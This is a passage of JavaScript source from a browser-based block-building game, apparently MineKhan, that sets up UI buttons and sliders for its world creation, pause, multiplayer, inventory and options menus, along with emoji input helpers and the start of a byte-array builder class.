		Button.add(165*ss, 280*ss, 300*ss, 40*ss, ["Cheats: On", "Cheats: Off"], "creation menu", r => {
			cheats = r === "Cheats: On"
		}, () => {
			if(p.gameMode === "creative"){cheats = true; return true}
			else if(p.gameMode === "hardcore"){cheats = false; return true}
		}, () => {
			let s = p.gameMode
			return "Cheats allow you to use many commands but disables achievments. Default cheats. May be inaccurate if you are not the host. "+(s === "creative" ? " You cannot turn off cheats in creative mode." : (s === "hardcore" ? " You cannot turn on cheats in hardcore mode." : ""))
		}, () => cheats ? 0 : 1).setScrollable(creationMenuScrollable)
		Button.add(475*ss, 30*ss, 300*ss, 40*ss, "More Settings", "creation menu", r => changeScene("worldSettings")).setScrollable(creationMenuScrollable)
		Button.add(475*ss, 80*ss, 300*ss, 40*ss, "Difficulty: Normal", "creation menu", nothing, always, "Normal mode only").setScrollable(creationMenuScrollable)
    /*Button.add(width / 2+155*ss, 100+135*ss, 300*ss, 40*ss, ["Cheats: On", "Cheats: Off"], "creation menu", r => cheats = r === "Cheats: On", () => {
      if(!survival) cheats = true
			else if(survival === "hardcore") cheats = false
      return !survival || survival === "hardcore"
    }, () => "Cheats allow you to use many commands but disables achievments."+(!survival ? " You cannot turn off cheats in creative mode." : (survival === "hardcore" ? " You cannot turn on cheats in hardcore mode." : "")), () => cheats ? 0 : 1)*/
		Button.add(475*ss, 130*ss, 300*ss, 40*ss, ["Fancy Rivers: On", "Fancy Rivers: Off"], "creation menu", r => fancyRivers = r === "Fancy Rivers: On", function() {
			if (worldType !== "large") {
				fancyRivers = false
			}
			return worldType !== "large"
		}, "Rivers that flow down! May slow down world generation. Requires large world type.", () => fancyRivers ? 0 : 1).setScrollable(creationMenuScrollable)
		Button.add(475*ss, 180*ss, 300*ss, 40*ss, "Seed Templates", "creation menu", () => changeScene("seed templates"), null, "Choose a specific seed to control how the world generates.").setScrollable(creationMenuScrollable)
		creationMenuScrollable.setScrollSize(300*ss)
		Button.add(475*ss, 230*ss, 300*ss, 40*ss, ["Structures: On", "Structures: Off"], "creation menu", r => structures = r === "Structures: On", function() {
			if (worldType === "void") {
				structures = false
			}
			return worldType === "void"
		}, "Structures may change in future versions.", () => structures ? 0 : 1).setScrollable(creationMenuScrollable)
		Button.add(width / 2, height - 90*ss, 300*ss, 40*ss, "Create New World", "creation menu", r => {
      createNewWorld()
		})
		Button.add(width / 2, height - 40*ss, 300*ss, 40*ss, "Cancel", "creation menu", r => changeScene("loadsave menu"))

		// Loadsave menu buttons
		const selected = () => !selectedWorld || !worlds[selectedWorld]
		let w4 = min(width / 4 - 10, 220)
		let x4 = w4 / 2 + 5
		let w2 = min(width / 2 - 10, 450)
		let x2 = w2 / 2 + 5
		let mid = width / 2
		/*Button.add(mid - 3 * x4, height - 30, w4, 40, "Edit", "loadsave menu", r => changeScene("editworld"), () => (selected() || !worlds[selectedWorld].edited))
		Button.add(mid - x4, height - 30, w4, 40, "Delete", "loadsave menu", deleteSelectedWorld, () => (selected() || !worlds[selectedWorld].edited), "Delete the world forever.")
		Button.add(mid + x4, height - 30, w4, 40, "Export", "loadsave menu", r => {
			boxCenterTop.value = worlds[selectedWorld].code
		}, selected, "Export the save code into the text box above for copy/paste.")*/
		Button.add(mid + 3 * x4, height - 40*ss, w4, 40*ss, "Back", "loadsave menu", r => changeScene("main menu"))
		Button.add(mid - x2, height - 40*ss, w2, 40*ss, "Play Selected World", "loadsave menu", playSelectedWorld, () => !(!selectedWorld && boxCenterTop.value) && !worlds[selectedWorld])
		//Button.add(mid + x2, height - 75, w2, 40, "Create New World", "loadsave menu", r => changeScene("creation menu"))
    
    //broken world buttons
    Button.add(mid, height / 2 + 50, w2, 40, "Cancel", "broken world", r => {changeScene("loadsave menu")})
    Button.add(mid, height / 2 + 105, w2, 40, "Load Anyways", "broken world", r => {
      try{
        playSelectedWorld()
      }catch(e){
        alert(e)
      }
    })

    // Edit world menu
		Button.add(mid, height / 2, w2, 40*ss, "Save", "editworld", r => {
			let w = worlds[selectedWorld]
			if (typeof w.code === "string") {
				// Legacy world saves
				w.name = boxCenterTop.value
				let split = w.code.split(";")
				split[0] = w.name
				w.code = split.join(";")
			} else {
				let oldLength = w.code[0]
				w.name = boxCenterTop.value
				let newLength = w.name.length
				let newCode = new Uint8Array(w.code.length + newLength - oldLength)
				newCode[0] = newLength
				for (let i = 0; i < newLength; i++) newCode[i + 1] = w.name.charCodeAt(i) & 255
				newCode.set(w.code.subarray(oldLength+1), newLength+1)
				w.code = newCode
			}
      saveToDB(w.id, w).then(success => {
				initWorldsMenu()
				changeScene("loadsave menu")
			})
		})
		Button.add(mid, height / 2 + 50, w2, 40*ss, "Back", "editworld", r => changeScene(previousScreen))
    
    // Multiplayer buttons
		/*Button.add(mid - x2, height - 75, w2, 40, "Join Server", "multiplayer menu", async() => {
      changeScene("multiplayer connecting")
			connectingProgress = "Authenticating..."
      initMultiplayer(servers[selectedWorld].id).then(joinWorld)
    }, () => !servers[selectedWorld])
    Button.add(mid + x2, height - 75, w2, 40, "More information", "multiplayer menu", () => {
      window.open("https://"+servers[selectedWorld].url, "_blank")
    }, () => !(servers[selectedWorld] && servers[selectedWorld].url))*/
    Button.add(mid - 3 * x4, height - 40*ss, w4, 40*ss, "Reload", "multiplayer menu", initServersMenu)
    Button.add(mid - 1 * x4, height - 40*ss, w4, 40*ss, "join eaglercraf server (experimental)", "multiplayer menu", joinEaglerServer, null,"it has bugs and no inventory")
		Button.add(mid + 3 * x4, height - 40*ss, w4, 40*ss, "Back", "multiplayer menu", r => changeScene("main menu"))
		
    //multiplayer connecting buttons
    Button.add(mid, height / 2 + 40, w2, 40, "Cancel", "multiplayer connecting", r => {multiplayer && multiplayer.close()})
    
    //multiplayer lost buttons
    Button.add(mid, height / 2 + 40, w2, 40, "Back", "multiplayer lost", r => changeScene("multiplayer menu"))
    Button.add(mid, height - 40, w2, 40, "Back", "multiplayer lost long", r => changeScene("multiplayer menu"))
    
    //loading buttons
    Button.add(width-x4/2, height-20, x4, 40, "Skip", "endPoem",() => {
      endPoemVideo.onended()
    })
    
    //play buttons
    let bs = 50*ss//s < 20 ? height/8 : s*0.75 //buton size
    let bs2 = bs / 2
    let showIfTouchscreen = () => !touchScreen && -1 || false
		let showArrows = () => (!touchScreen || settings.joystick) && -1 || false
    Button.add(mid-bs2, bs2, bs,bs, "", "play", () => Messages.showInput(), showIfTouchscreen)
    Button.add(mid+bs2, bs2, bs,bs, "", "play", r => changeScene("pause"), showIfTouchscreen)
		/*.setIcon(function(){
			ctx.fillStyle = "white"
			ctx.fillRect(this.x-this.w*0.225,this.y-this.h*0.3,this.w*0.15,this.h*0.6)
			ctx.fillRect(this.x+this.w*0.075,this.y-this.h*0.3,this.w*0.15,this.h*0.6)
		})*/
    Button.add(bs*3, height-bs*5, bs*2,bs*2, "", "play", r => {
      keydown({type:"controlName",key:"forward"})
    }, showArrows,null,null, r => keyup({type:"controlName",key:"forward"})).setSize(bs)
    Button.add(bs, height-bs*3, bs*2,bs*2, "", "play", r => keydown({type:"controlName",key:"left"}), showArrows,null,null, r => keyup({type:"controlName",key:"left"})).setSize(bs)
    Button.add(bs*5, height-bs*3, bs*2,bs*2, "", "play", r => keydown({type:"controlName",key:"right"}), showArrows,null,null, r => keyup({type:"controlName",key:"right"})).setSize(bs)
    Button.add(bs*3, height-bs, bs*2,bs*2, "", "play", r => keydown({type:"controlName",key:"backward"}), showArrows,null,null, r => keyup({type:"controlName",key:"backward"})).setSize(bs)
		Button.add(bs*3, height-bs*3, bs*2,bs*2, "", "play", ()=>{}, () => (!touchScreen || !settings.joystick) && -1 || false).customDraw(function(){
			if (!this.scenes.includes(screen)) {
				return
			}
			let disabled = this.disabled()
      if(disabled === -1) return
			let x = 0, y = 0, d = 1
			if(this.touch){
				x = this.touch.pageX - this.x
				y = this.touch.pageY - this.y
				d = sqrt(x*x+y*y)/(this.w*2/3)
				if(d >= 1 && !p.sprinting && !p.sneaking){
					p.sprinting = true
        	p.camera.FOV(settings.fov + 10, 125)
				}
			}
			pTouch.joystickX = -x/(this.w*2/3)/d
			pTouch.joystickY = -y/(this.w*2/3)/d
			ctx.globalCompositeOperation = 'destination-out'
			fill(0,0,0)
			ellipse(this.x,this.y,this.w,this.h,true)//erase it
			ctx.globalCompositeOperation = "source-over"
			fill(255,255,255,50)
			ellipse(this.x,this.y,this.w,this.h,true)
			fill(0,0,0,50)
			if(d > 1){
				x /= d
				y /= d
			}
			ellipse(this.x+x,this.y+y,this.w/3,this.h/3,true)
		})
    Button.add(width-bs, height-bs*3, bs*2,bs*2, "", "play", r => {
      keydown({type:"controlName",key:"jump"})
    }, showIfTouchscreen,null,null, r => keyup({type:"controlName",key:"jump"})).setSize(bs)
    Button.add(width-bs, height-bs, bs*2,bs*2, "", "play", r => {
      keydown({type:"controlName",key:"sneak"})
    }, showIfTouchscreen,null,null, r => {
      keyup({type:"controlName",key:"sneak"})
    }).setSize(bs)

		Button.add(width-bs, height-bs*4.5, bs*2,bs, "Sit", "play", r => {
      keydown({type:"controlName",key:"sit"})
			keyup({type:"controlName",key:"sit"})
    }, showIfTouchscreen,null,null,null).setSize(bs/3)
		Button.add(width-bs, height-bs*5.5, bs*2,bs, "View", "play", toggleView, showIfTouchscreen,null,null,null).setSize(bs/3)
    
    //chat buttons
		document.querySelector("#messagesEnter").onclick = () => Messages.submitInput()
		document.querySelector("#messagesCmdHelp").onclick = () => {messageInput.value = "/?"; Messages.updateInput()}
    //Button.add(width-50, height-25, 100,50, "enter", "chat", () => Messages.submitInput())
    //Button.add(25, height-25, 50,50, "/?", "chat", () => {messageInput.value = "/?"; Messages.updateInput()})

		// Pause buttons
		Button.add(width/2, height / 2 + -175*ss, 420*ss, 40*ss, "Resume", "pause", play)
		Button.add(width/2-110*ss, height / 2 + -125*ss, 200*ss, 40*ss, "Options", "pause", r => changeScene("options"))
		Button.add(width/2-110*ss, height / 2 + -75*ss, 200*ss, 40*ss, "Save", "pause", () => {
			lastAutosave = now
			autosaveTimer = null
			saving = true
			if(host){
				serverWorld.sendAll({type:"saveProg",data:"save"})
				save().then(() => {
					saving = false
					serverWorld.sendAll({type:"saveProg",data:"end"})
				})
			}
		}, () => !host, () => `Save the world to your browser and account. Doesn't work in incognito.\n\nLast saved ${timeString(Date.now() - (host ? serverWorld.edited : 0))}.`)
		Button.add(width/2-110*ss, height / 2 + -25*ss, 200*ss, 40*ss, "Get Save Code", "pause", r => {
			savebox.classList.remove("hidden")
			saveDirections.classList.remove("hidden")
			savebox.value = serverWorld.getSaveString()
		}, () => !host)
    Button.add(width/2-110*ss, height / 2 + 25*ss, 200*ss, 40*ss, ["Enable Multiplayer","Disable Multiplayer"], "pause", async r => {
			if(websocket){
				disableMultiplayer()
			}else{
				let logged
				await loggedIn().then(r => logged = r)
				if(logged){
					enableMultiplayer()
				}
			}
		}, () => !host || preVersion && !(userInfo&&userInfo.admin), () => "Enabling multiplayer enables others to join. Use whitelist command to allow only some people to join. /whitelist enable /whitelist add username1234", () => websocket ? 1 : 0)
    Button.add(width/2-110*ss, height / 2 + 75*ss, 200*ss, 40*ss, "Invite", "pause", r => {
      savebox.classList.remove("hidden")
			savebox.value = "https://thingmaker.us.eu.org/minekhan/?target="+world.id
		}, () => !websocket, () => "Invite someone to this world if it is multiplayer.")
    //Button.add(width/2+110*ss, height / 2 + -125*ss, 200*ss, 40*ss, "Packet Viewer", "pause", r => changeScene("packetViewer raw"), null, "View data from multiplayer packets.")
    Button.add(width/2+110*ss, height / 2 + -125*ss, 200*ss, 40*ss, "Achievments", "pause", r => changeScene("achievments"), () => cheats)
		Button.add(width/2+110*ss, height / 2 + -75*ss, 200*ss, 40*ss, "World Options", "pause", r => changeScene("worldSettings"))
		Button.add(width/2+110*ss, height / 2 + -25*ss, 200*ss, 40*ss, ["Start record","Stop record"], "pause", r => recording ? stopRecord() : startRecord(), null, "Record video of screen", () => recording?1:0)
		Button.add(width/2, height / 2 + 125*ss, 420*ss, 40*ss, "Exit Without Saving", "pause", r => {
			/*if(!host){
				multiplayer.sendInvStuff()
				multiplayer.sendPos(true)
			}*/
			multiplayer.close()
			if(!host){
				if(websocket) websocket.close()
			}else{
				changeScene("main menu")
				if(websocket) disableMultiplayer()
				serverWorld.close()
			}
      updateTitle(false)
		})
    Button.add(width/2, 10+20*ss, 300*ss, 40*ss, "Download This World", "pause", r => {
			getSaveJSON().then(data => {
				let a = document.createElement("a")
				a.href = "data:text/plain,"+data
				a.download = serverWorld.name+".minekhan"
				a.click()
			})
		}, () => saveDirections.classList.contains("hidden") && -1)
		Button.add(width/2, 10+20*ss, 300*ss, 40*ss, "Invite With Username", "pause", r => {
      let u = prompt("username")
			if(websocket) sendWS({type:"invite",data:u})
			else alert("Can not invite")
		}, () => (savebox.classList.contains("hidden") || !saveDirections.classList.contains("hidden")) && -1)

		//loading buttons
		Button.add(width - 60*ss, height-15*ss, 120*ss, 30*ss, "Skip Waiting", ["loading","netherLoading","endLoading"], () => skipWaitingLoading = true, () => chunkHereLoaded() ? false : -1)
		
    // Inventory buttons
    let hideIfSurvival = () => p.survival && -1
    // === "chest" //help find this with find
    Button.add(width - 50, 15*ss, 60*ss, 30*ss, "close", ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], play)
    Button.add(width - 20 - 60*ss, height-15*ss, 120*ss, 30*ss, "Inventory", ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => {invCategory(0)}, hideIfSurvival)
    Button.add(width - 20 - 60*ss, height-45*ss, 120*ss, 30*ss, "Search", ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("search"), hideIfSurvival)
    Button.add(width - 20 - 60*ss, height-75*ss, 120*ss, 30*ss, blockCategories.build, ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("build"), hideIfSurvival)//.setIcon("categoryConstruction")
    Button.add(width - 20 - 60*ss, height-105*ss, 120*ss, 30*ss, blockCategories.decoration, ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("decoration"), hideIfSurvival)
    Button.add(width - 20 - 60*ss, height-135*ss, 120*ss, 30*ss, blockCategories.food, ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("food"), hideIfSurvival)
    Button.add(width - 20 - 60*ss, height-165*ss, 120*ss, 30*ss, blockCategories.items, ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("items"), hideIfSurvival)//.setIcon("categoryItems")
    Button.add(width - 20 - 60*ss, height-195*ss, 120*ss, 30*ss, blockCategories.nature, ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("nature"), hideIfSurvival)//.setIcon("categoryNature")
    Button.add(width - 20 - 60*ss, height-225*ss, 120*ss, 30*ss, blockCategories.redstone, ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("redstone"), hideIfSurvival)
    Button.add(width - 20 - 60*ss, height-255*ss, 120*ss, 30*ss, blockCategories.tools, ["inventory","crafting","furnace","chest","anvil","dispenser","hopper"], () => invCategory("tools"), hideIfSurvival)//.setIcon("categoryTools")
    
    // You Died buttons
    Button.add(width / 2, 225*ss, 300*ss, 40*ss, "Respawn", "dead", r => {
			waitingRespawn = true
      send({type:"respawn"})
    }, () => p.gameMode === "hardcore" && -1 || performance.now() - lastDeathTime < 1000 || waitingRespawn)
		//hardcore
		Button.add(width / 2, 225*ss, 300*ss, 40*ss, "Spectate", "dead", r => {
			waitingRespawn = true
			send({type:"respawn"})
      /*respawn()
			p.gameMode = "spectator"
      play()*/
    }, () => p.gameMode !== "hardcore" && -1 || performance.now() - lastDeathTime < 1000 || waitingRespawn)
    
    //Edit sign buttons
    Button.add(width / 2, height-30, width / 3, 40, "Done", "edit sign", r => {
      play()
    })
    
    //sleep buttons
    Button.add(width / 2, height-30, width/2.25, 40, "Leave Bed", "sleep", () => {p.y += p.height*0.5; p.sleeping = false; play()})
    
    //Help buttons
    Button.add(60, 30, 80, 30, "Back", "options help", r => changeScene(previousScreen))
    
    // Marketplace buttons
    Button.add(60*ss, 40*ss, 80*ss, 30*ss, "Back", "marketplace", r => changeScene("main menu"))
		Button.add(mid - x2, height - 40*ss, w2, 40*ss, "Download", ["marketplace", "marketplace info"], saveFromMarketplace, () => !marketplace[selectedWorld])
    Button.add(mid + x2, height - 40*ss, w2, 40*ss, "Description", "marketplace", r => changeScene("marketplace info"), () => !marketplace[selectedWorld])
    Button.add(60*ss, 40*ss, 80*ss, 30*ss, "Back", "marketplace info", r => changeScene("marketplace"))
    
		// Comingsoon menu buttons
		Button.add(width / 2, height/2+95*ss, width / 3, 40*ss, "Back", "comingsoon menu", r => changeScene(previousScreen))

		// Options Sliders & Buttons
    let needsCheats = () => !cheats
    let noCheatsThenSayIt = (setting,dEfault) => {
			return () => {
				if(!cheats){
					worldSettings[setting] = dEfault
					return "This requires cheats."
				}
			}
		}
		let optionsPage = [
			Slider.add(0,0, width / 3, 40*ss, "options", "Render Distance", 1, 32, "renderDistance", val => settings.renderDistance = round(val)),
			Slider.add(0,0, width / 3, 40*ss, "options", "FOV", 30, 110, "fov", val => {
				p.camera.FOV(val)
				if (world) {
					p.camera.setDirection()
					world.render()
				}
			}),
			Slider.add(0,0, width / 3, 40*ss, "options", "Mouse Sensitivity", 30, 400, "mouseSense", val => settings.mouseSense = val),
			Slider.add(0,0, width / 3, 40*ss, "options", "Reach distance", 5, 100, "reach", val => settings.reach = val),
			//Button.add(width / 2, 500, width / 3, 40, ["Sound: On", "Sound: Off"], "options", r => soundOn = r === "Sound: On")
			Slider.add(0,0, width / 3, 40*ss, "options", "Sound Volume", 0,1, "volume", val => settings.volume = val, true, val => {playSound("block.grass.dig1")}, {"0%":"Off"}),
			Button.add(0,0, width / 3, 40*ss, "Change Controls", "options", r => changeScene("options controls")),
			Button.add(0,0, width / 3, 40*ss, "Change skin", "options", r => {
				if(userInfo){
					window.open("/account#skin", "_blank")
				}else{
					window.open("/login?redirect=account%23skin", "_blank")
				}
			}, null, "Are you really that lazy???"),
			Button.add(0,0, width / 3, 40*ss, "Resource Packs", "options", r => changeScene("options resourcePacks"), () => !inWorld, "Change how things look."),
			Button.add(0,0, width / 3, 40*ss, "Help", "options", r => changeScene("options help")),
			Button.add(0,0, width / 3, 40*ss, ["Graphics: Normal","Graphics: Fast","Graphics: More Realistic"], "options", r => {
				let prevMoreReal = settings.graphics === "morereal"
				settings.graphics = r === "Graphics: Fast" && "fast" || r === "Graphics: More Realistic" && "morereal"
				updatePerformFast()
				let moreReal = settings.graphics === "morereal"
				if(prevMoreReal !== moreReal) initWebglPrograms()
			}, null,"Setting to fast will disable certain particles, disable certain animations, and more.", () => settings.graphics === "fast" ? 1 : (settings.graphics === "morereal" ? 2 : 0)),
			Button.add(0,0, width / 3, 40*ss, ["Resolution: Maximum","Resolution: Default","Resolution: Low"], "options", r => {settings.resolution = (r === "Resolution: Maximum") ? "max" : ((r === "Resolution: Low") ? "low" : ""); onresize(); if(world) world.render()}, null,null, () => settings.resolution === "max" ? 0 : (settings.resolution === "low" ? 2 : 1)),
			Button.add(0,0, width / 3, 40*ss, "Narrator Options", "options", r => changeScene("options narrator")),
			Button.add(0,0, width / 3, 40*ss, "Languages", "options", r => changeScene("options languages")),
			Button.add(0,0, width / 3, 40*ss, ["Auto adjust brightness: On","Auto adjust brightness: Off"], "options", r => settings.adjustBrightness = r === "Auto adjust brightness: On", null,null, () => settings.adjustBrightness ? 0 : 1),
			Button.add(0,0, width / 3, 40*ss, ["View: First person","View: Third person back","View: Third person front"], "options", toggleView, null,null, () => p.thirdPerson === "front" ? 2 : (p.thirdPerson ? 1 : 0)),
			Button.add(0,0, width / 3, 40*ss, ["Touchscreen Controls: Arrows","Touchscreen Controls: Joystick"], "options", r => settings.joystick = r === "Touchscreen Controls: Joystick", null,null, () => settings.joystick ? 1 : 0),
		]
    //Button.add(width * 0.75, height/2 + -5, width / 3, 40, ["Start sending audio","Stop sending audio"], "options", r => recordingAudio ? stopRecordAudio() : startRecordAudio(), () => true||!multiplayer,"Sends audio from your microphone to other players. Only works in multiplayer.", () => recordingAudio ? 1 : 0)
		let y = 20, x = false
		for(let b of optionsPage){
			b.originalX = b.x = x ? width*0.75 : width*0.25
			b.originalY = b.y = y*ss
			b.setScrollable(optionsScrollable)
			x = !x
			if(!x){
				y += 60
			}
		}
		optionsScrollable.setPos(0, 80*ss, width, height-200*ss)
		optionsScrollable.setScrollSize(y)
    Button.add(width / 2, height - 50*ss, width / 3, 40*ss, "Back", ["options"], r => changeScene(beforeOptionsScreen))
		/*Button.add(width-30*ss, height/2, 30*ss,30*ss,"","options", r => changeScene("options 2"))
		Button.add(30*ss, height/2, 30*ss,30*ss,"","options 2", r => changeScene("options"))*/
    
    // World settings buttons
    Button.add(width / 4, height/2 + -185*ss, width / 3, 40*ss, ["TNT Explodes: On","TNT Explodes: Off"], "worldSettings", r => worldSettings.tntExplode = r === "TNT Explodes: On", null, null, () => worldSettings.tntExplode ? 0 : 1)
    Button.add(width / 4, height/2 + -125*ss, width / 3, 40*ss, ["Kill command enabled","Kill command disabled"], "worldSettings", r => worldSettings.killCmdOff = r === "Kill command disabled", null, null, () => worldSettings.killCmdOff ? 1 : 0)
    Button.add(width / 4, height/2 + -65*ss, width / 3, 40*ss, ["Day/Night Cycle: On", "Day/Night Cycle: Off"], "worldSettings", r => worldSettings.dayNightCycle = r === "Day/Night Cycle: On", needsCheats, noCheatsThenSayIt("dayNightCycle",true), () => worldSettings.dayNightCycle ? 0 : 1)
    Button.add(width / 4, height/2 + -5*ss, width / 3, 40*ss, ["Blocks Fall: On", "Blocks Fall: Off"], "worldSettings", r => worldSettings.blocksFall = r === "Blocks Fall: On", needsCheats, noCheatsThenSayIt("blocksFall",true), () => worldSettings.blocksFall ? 0 : 1)
		Button.add(width / 4, height/2 + 55*ss, width / 3, 40*ss, ["Default Game Mode: Creative", "Default Game Mode: Survival", "Default Game Mode: Hardcore"], "worldSettings", r => {
			if(!inWorld){
				p.gameMode = r === "Default Game Mode: Survival" && "survival" || !inWorld && r === "Default Game Mode: Hardcore" && "hardcore" || "creative"
				if(p.survival) cheats = false
				else cheats = true
			}else if(host){
				serverWorld.gameMode = r === "Default Game Mode: Survival" && "survival" || !inWorld && r === "Default Game Mode: Hardcore" && "hardcore" || "creative"
			}
		}, () => inWorld && (!host || !cheats), () => (inWorld && !cheats && "This requires cheats. " || "") + "Default Game Mode for new players joining. Own game mode can be changed with commands after world creation. May be inaccurate if you are not the host.", () => {let s = inWorld && host ? serverWorld.gameMode : p.gameMode; return s === "survival" ? 1 : (s === "hardcore" ? 2 : 0)})
		Button.add(width / 4, height/2 + 115*ss, width / 3, 40*ss, ["Default Cheats: On", "Default Cheats: Off"], "worldSettings", r => {
			if(!inWorld){
				cheats = r === "Default Cheats: On"
			}else if(host){
				serverWorld.cheats = r === "Default Cheats: On"
			}
		}, () => {
			if(!inWorld){
				if(p.gameMode === "creative"){cheats = true; return true}
				else if(p.gameMode === "hardcore"){cheats = false; return true}
			}else if(host){
				if(!cheats/*cheats is off for host*/) return true
				if(serverWorld.gameMode === "creative"){serverWorld.cheats = true; return true}
				else if(serverWorld.gameMode === "hardcore"){serverWorld.cheats = false; return true}
			}else return true
		}, () => {
			let s = inWorld && host ? serverWorld.gameMode : p.gameMode
			return "Cheats allow you to use many commands but disables achievments. Default cheats for new players joining. May be inaccurate if you are not the host. "+(s === "creative" ? " You cannot turn off cheats in creative mode." : (s === "hardcore" ? " You cannot turn on cheats in hardcore mode." : ""))
		}, () => (inWorld && host ? serverWorld.cheats : cheats) ? 0 : 1)
    Button.add(width * 0.75, height/2 + -185*ss, width / 3, 40*ss, ["Attack: On","Attack: Off"], "worldSettings", r => worldSettings.attack = r === "Attack: On", null, null, () => worldSettings.attack ? 0 : 1)
    Button.add(width * 0.75, height/2 + -125*ss, width / 3, 40*ss, ["Fire spreads: On","Fire spreads: Off"], "worldSettings", r => worldSettings.fireSpreads = r === "Fire spreads: On", null, null, () => worldSettings.fireSpreads ? 0 : 1)
		Button.add(width * 0.75, height/2 + -65*ss, width / 3, 40*ss, ["Weather Cycle: On", "Weather Cycle: Off"], "worldSettings", r => worldSettings.weatherCycle = r === "Weather Cycle: On", needsCheats, noCheatsThenSayIt("weatherCycle",true), () => worldSettings.weatherCycle ? 0 : 1)
    Button.add(width * 0.75, height/2 + -5*ss, width / 3, 40*ss, ["Mob Spawning: On", "Mob Spawning: Off"], "worldSettings", r => worldSettings.mobSpawning = r === "Mob Spawning: On", null, null, () => worldSettings.mobSpawning ? 0 : 1)
    Button.add(width * 0.75, height/2 + 55*ss, width / 3, 40*ss, ["Autosave: On", "Autosave: Off"], "worldSettings", r => worldSettings.autosave = r === "Autosave: On", null, null, () => worldSettings.autosave ? 0 : 1)
    Button.add(width / 2, height - 50*ss, width / 3, 40*ss, "Back", "worldSettings", r => changeScene(previousScreen))
    
    // Control menu buttons
		Button.add(mid - x2, height - 30, w2, 40, "Done", "options controls", r => {
      changeScene(previousScreen)
		})
    Button.add(mid + x2, height - 30, w2, 40, "Reset Controls", "options controls", r => resetControls(), () => controlsAreDefault)
    
    //Narrator options buttons
    Button.add(width / 2, height/2 + -245, width / 3, 40, ["Chat Narrator: Off", "Chat Narrator: On"], "options narrator", r => {
      settings.narrator = r === "Chat Narrator: On"
      speakIt()
    }, null, null, () => settings.narrator ? 1 : 0)
    Slider.add(width / 2, height/2 + -185, width / 3, 40, "options narrator", "Narrator Rate", 0.1,10, "narratorRate", val => settings.narratorRate = val, true, val => speakIt())
    Slider.add(width / 2, height/2 + -125, width / 3, 40, "options narrator", "Narrator Pitch", 0,10, "narratorPitch", val => settings.narratorPitch = val, true, val => speakIt())
    
    Button.add(width / 2, height - 50, width / 3, 40, "Back", "options narrator", r => changeScene(previousScreen))

    //Language buttons
    Button.add(mid - x2, height - 75, w2, 40, "Done", "options languages", r => changeScene(previousScreen))
		Button.add(mid + x2, height - 75, w2, 40, "Set language", "options languages", async r => {
			if(selectedLanguage === "none") settings.language = null
			else settings.language = selectedLanguage
			language = languages[selectedLanguage] || null
			document.documentElement.lang = language ? language.id : "en-us"
			let s = screen, ps = previousScreen
			changeScene("loadingResources")
			await waitAFrame()
			saveToDB("settings", compareObject(defaultSettings,settings))
			await initResources()
			changeScene(s)
			previousScreen = ps
		}, () => !selectedLanguage)

		//Resource packs button
		Button.add(mid - x2, height - 75, w2, 40, "Done", "options resourcePacks", async r => {
			let s = previousScreen
			if(resourcePacksChanged){
				serverWorld.setResourcePacks(world.activeResourcePacks)
			}
			changeScene(s)
		})
		Button.add(mid + x2, height - 75, w2, 40, "Add from URL", "options resourcePacks", async r => {
			let url = prompt("Please enter URL of resource pack. (can be relative path)","https://")
			if(!url) return
			initResourcePacksMenu(url)
		}, () => !host)

		/*//Packet viewer buttons
		Button.add(width-60*ss, 30*ss, 80*ss, 30*ss, "View Raw", ["packetViewer raw","packetViewer json"], r => changeScene("packetViewer raw"))
		Button.add(width-160*ss, 30*ss, 80*ss, 30*ss, "View JSON", ["packetViewer raw","packetViewer json"], r => changeScene("packetViewer json"))
		Button.add(60*ss, 30*ss, 80*ss, 30*ss, "Back", ["packetViewer raw","packetViewer json"], r => changeScene("pause"))*/

		//Seed templates buttons
    Button.add(60*ss, 40*ss, 80*ss, 30*ss, "Back", "seed templates", r => changeScene("creation menu"))

		//Achievments buttons
		Button.add(width-60*ss, 30*ss, 80*ss, 30*ss, "Achievments", ["achievments","achievments discoveries"], r => changeScene("achievments"))
		Button.add(width-160*ss, 30*ss, 80*ss, 30*ss, "Blocks", ["achievments","achievments discoveries"], r => changeScene("achievments discoveries"))
		Button.add(60*ss, 30*ss, 80*ss, 30*ss, "Back", ["achievments","achievments discoveries"], r => changeScene("pause"))
  }
	function initInputs(){
		let inputs = doc.getElementsByClassName("type-emoji")
		for(let i of inputs){
			let div = doc.createElement("div")
			div.className = "type-emoji-button"
			div.innerHTML = ""
			let id = i.id
			div.onclick = () => showEmojis(id)
			i.parentNode.insertBefore(div, i.nextSibling)
			doc.querySelector(".emoji-list[data-for='"+id+"']").classList.add("hidden")
		}
	}
	function showEmojis(id){
		let list = doc.querySelector(".emoji-list[data-for='"+id+"']")
		list.classList.toggle("hidden")
		if(!list.classList.contains("hidden")){
			list.innerHTML = ""
			function addOne(c,style){
				let span = doc.createElement("span")
				span.textContent = c
				if(style) span.style = style
				list.appendChild(span)
				span.onclick = () => {
					let input = document.getElementById(id)
					input.setRangeText(c, input.selectionStart, input.selectionEnd, 'end')
					if(input.oninput) input.oninput()
					input.focus()
				}
			}
			for(let c of emojis) addOne(c)
			for(let c in colors.css) addOne(""+c,"color:"+colors.css[c])
			addOne("l","font-weight:bold")
			addOne("o","font-style:italic")
			addOne("r")
		}
	}

	//Use ByteArray when everything is byte aligned because it is faster
	class ByteArrayBuilder{
		constructor(){
			this.arr = []
		}
		validate(x, mask=255){
			if(+x !== x) throw new Error("Incorrect type "+x)
			if(x>mask || (x|0) !== (x&mask)) throw new Error("Incorrect value "+x)
		}
		str(chars){
			for(let c of chars) this.arr.push(c.charCodeAt(0))
		}
		uint8(x, cur = this.cur){
			this.validate(x)
			this.arr[cur] = x|0
		}
		uint16(x, cur = this.cur){
			this.validate(x,0xffff)
			this.arr[cur] = x>>>8
			this.arr[cur+1] = x&255
		}
		uint32(x, cur = this.cur){
			this.validate(x,0xffffffff)
			this.arr[cur] = x>>>24
			this.arr[cur+1] = (x>>>16)&255
			this.arr[cur+2] = (x>>>8)&255
			this.arr[cur+3] = x&255
		}
		int8(x, cur = this.cur){
			if(x & 0x80000000) this.validate(~x,0x8000007f)//negative
			else this.validate(x,0x8000007f)
